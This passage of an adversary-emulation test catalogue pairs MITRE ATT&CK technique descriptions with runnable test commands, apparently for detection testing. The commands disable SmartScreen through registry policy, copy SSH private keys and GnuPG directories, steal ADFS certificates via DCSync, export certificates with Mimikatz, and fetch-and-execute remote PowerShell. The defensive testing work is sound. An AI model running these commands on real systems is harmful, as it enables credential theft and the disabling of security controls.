GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)", "atomic_tests": [{"name": "LockBit Black - Modify Group policy settings -cmd", "auto_generated_guid": "9ab80952-74ee-43da-a98c-1e740a985f28", "description": "An adversary can modify the group policy settings.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LockBit Black - Modify Group policy settings -Powershell", "auto_generated_guid": "b51eae65-5441-4789-b8e8-64783c26c1d1", "description": "An adversary modifies group policy settings\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n", "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1217": {"name": "Browser Information Discovery", "technique_id": "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7", "external_id": "T1217", "data_components": ["Command Execution", "File Access", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)", "atomic_tests": [{"name": "List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux", "auto_generated_guid": "3a41f169-a5ab-407f-9269-abafdb5da6c2", "description": "Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "path", "default": "/tmp/T1217-Firefox.txt"}}, "executor": {"command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "List Mozilla Firefox Bookmark Database Files on macOS", "auto_generated_guid": "1ca1f9c7-44bc-46bb-8c85-c50e2e94267b", "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "path", "default": "/tmp/T1217_Firefox.txt"}}, "executor": {"command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "List Google Chrome Bookmark JSON Files on macOS", "auto_generated_guid": "b789d341-154b-4a42-a071-9111588be9bc", "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "path", "default": "/tmp/T1217-Chrome.txt"}}, "executor": {"command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "List Google Chromium Bookmark JSON Files on FreeBSD", "auto_generated_guid": "88ca025b-3040-44eb-9168-bd8af22b82fa", "description": "Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "path", "default": "/tmp/T1217-Chrome.txt"}}, "executor": {"command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "List Google Chrome / Opera Bookmarks on Windows with powershell", "auto_generated_guid": "faab755e-4299-48ec-8202-fc7885eb6545", "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "name": "powershell"}}, {"name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt", "auto_generated_guid": "76f71e2f-480e-4bed-b61e-398fe17499d5", "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "where /R C:\\Users\\ Bookmarks\n", "name": "command_prompt"}}, {"name": "List Mozilla Firefox bookmarks on Windows with command prompt", "auto_generated_guid": "4312cdbc-79fc-4a9c-becc-53d49c734bc5", "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "where /R C:\\Users\\ places.sqlite\n", "name": "command_prompt"}}, {"name": "List Internet Explorer Bookmarks using the command prompt", "auto_generated_guid": "727dbcdb-e495-4ab1-a6c4-80c7f77aef85", "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder", "supported_platforms": ["windows"], "executor": {"command": "dir /s /b %USERPROFILE%\\Favorites\n", "name": "command_prompt"}}, {"name": "List Safari Bookmarks on MacOS", "auto_generated_guid": "5fc528dd-79de-47f5-8188-25572b7fafe0", "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed.", "type": "path", "default": "/tmp/T1217-Safari.txt"}}, "executor": {"command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file} \ncat #{output_file} \n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}]}, "T1552.004": {"name": "Private Keys", "technique_id": "attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf", "external_id": "T1552.004", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.", "atomic_tests": [{"name": "Private Keys", "auto_generated_guid": "520ce462-7ca7-441e-b5a5-f8347f632696", "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n", "supported_platforms": ["windows"], "executor": {"command": "dir c:\\ /b /s .key | findstr /e .key\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Discover Private SSH Keys", "auto_generated_guid": "46959285-906d-40fa-9437-5a439accd878", "description": "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"search_path": {"description": "Path where to start searching from.", "type": "path", "default": "/"}, "output_file": {"description": "Output file containing locations of SSH key files", "type": "path", "default": "/tmp/keyfile_locations.txt"}}, "executor": {"command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\nexit 0\n", "cleanup_command": "rm #{output_file}\n", "name": "sh"}}, {"name": "Copy Private SSH Keys with CP", "auto_generated_guid": "7c247dc7-5128-4643-907b-73a76d9135c3", "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n", "supported_platforms": ["linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from.", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "Copy Private SSH Keys with CP (freebsd)", "auto_generated_guid": "12e4a260-a7fd-4ed8-bf18-1a28c1395775", "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.\n", "supported_platforms": ["linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from.", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Install GNU cp from coreutils package.\n", "prereq_command": "if [ ! -x \"$(command -v gcp)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y coreutils)\n"}], "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \\;\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "Copy Private SSH Keys with rsync", "auto_generated_guid": "864bb0b2-6bb5-489a-b43b-a77b3a16d68a", "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from.", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\nexit 0\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "Copy Private SSH Keys with rsync (freebsd)", "auto_generated_guid": "922b1080-0b95-42b0-9585-b9a5ea0af044", "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.\n", "supported_platforms": ["linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from.", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing copies of SSH private key files", "type": "path", "default": "/tmp/art-staging"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if rsync is installed.\n", "prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y rsync)\n"}], "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "Copy the users GnuPG directory with rsync", "auto_generated_guid": "2a5a0601-f5fb-4e2e-aa09-73282ae6afca", "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing a copy of the .gnupg directory", "type": "path", "default": "/tmp/GnuPG"}}, "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\nexit 0\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "Copy the users GnuPG directory with rsync (freebsd)", "auto_generated_guid": "b05ac39b-515f-48e9-88e9-2f141b5bcad0", "description": "Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.\n", "supported_platforms": ["linux"], "input_arguments": {"search_path": {"description": "Path where to start searching from", "type": "path", "default": "/"}, "output_folder": {"description": "Output folder containing a copy of the .gnupg directory", "type": "path", "default": "/tmp/GnuPG"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if rsync is installed.\n", "prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y rsync)\n"}], "executor": {"command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\n", "cleanup_command": "rm -rf #{output_folder}\n", "name": "sh"}}, {"name": "ADFS token signing and encryption certificates theft - Local", "auto_generated_guid": "78e95057-d429-4e66-8f82-0f060c1ac96f", "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AADInternals module must be installed.\n", "prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n", "get_prereq_command": "Install-Module -Name AADInternals -Force\n"}], "executor": {"command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n", "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "ADFS token signing and encryption certificates theft - Remote", "auto_generated_guid": "cab413d8-9e4a-4b8d-9b84-c985bd73a442", "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "supported_platforms": ["windows"], "input_arguments": {"adfs_service_account_name": {"description": "Name of the ADFS service account", "type": "string", "default": "adfs_svc"}, "replication_user": {"description": "Username with replication rights. It can be the Domain Admin running the script", "type": "string", "default": "Administrator"}, "replication_password": {"description": "Password of replication_username", "type": "string", "default": "ReallyStrongPassword"}, "adfs_server_name": {"description": "Name of an ADFS server", "type": "string", "default": "sts.contoso.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AADInternals and ActiveDirectory modules must be installed.\n", "prereq_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n", "get_prereq_command": "Install-Module -Name AADInternals -Force\n"}], "executor": {"command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n", "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "CertUtil ExportPFX", "auto_generated_guid": "336b25bf-4514-4684-8924-474974f28137", "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n", "supported_platforms": ["windows"], "input_arguments": {"output": {"description": "file path to export to", "type": "path", "default": "c:\\temp\\atomic.pfx"}, "password": {"description": "password for cert", "type": "string", "default": "password"}}, "executor": {"command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n", "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n", "name": "powershell", "elevation_required": true}}, {"name": "Export Root Certificate with Export-PFXCertificate", "auto_generated_guid": "7617f689-bbd8-44bc-adcd-6f8968897848", "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n", "supported_platforms": ["windows"], "input_arguments": {"pfx_path": {"description": "output path of the certificate", "type": "string", "default": "$env:Temp\\atomicredteam.pfx"}}, "executor": {"command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd\n", "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n", "name": "powershell", "elevation_required": true}}, {"name": "Export Root Certificate with Export-Certificate", "auto_generated_guid": "78b274f8-acb0-428b-b1f7-7b0d0e73330a", "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n", "supported_platforms": ["windows"], "input_arguments": {"pfx_path": {"description": "Path of the certificate", "type": "path", "default": "$env:Temp\\AtomicRedTeam.cer"}}, "executor": {"command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n", "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n", "name": "powershell", "elevation_required": true}}, {"name": "Export Certificates with Mimikatz", "auto_generated_guid": "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86", "description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n", "supported_platforms": ["windows"], "input_arguments": {"mimikatz_exe": {"description": "Path of the Mimikatz binary", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n", "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"command": "\"#{mimikatz_exe}\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n", "name": "command_prompt", "elevation_required": true}}]}, "T1021.006": {"name": "Windows Remote Management", "technique_id": "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65", "external_id": "T1021.006", "data_components": ["Command Execution", "Logon Session Creation", "Process Creation", "Network Connection Creation", "Service Metadata"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)", "atomic_tests": [{"name": "Enable Windows Remote Management", "auto_generated_guid": "9059e8de-3d7d-4954-a322-46161880b9cf", "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n", "supported_platforms": ["windows"], "executor": {"command": "Enable-PSRemoting -Force\n", "name": "powershell", "elevation_required": true}}, {"name": "Remote Code Execution with PS Credentials Using Invoke-Command", "auto_generated_guid": "5295bd61-bd7e-4744-9d52-85962a4cf2d6", "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n", "supported_platforms": ["windows"], "executor": {"command": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "cleanup_command": "Disable-PSRemoting -Force", "name": "powershell"}}, {"name": "WinRM Access with Evil-WinRM", "auto_generated_guid": "efe86d95-44c4-4509-ae42-7bfd9d1f5b3d", "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "Username", "type": "string", "default": 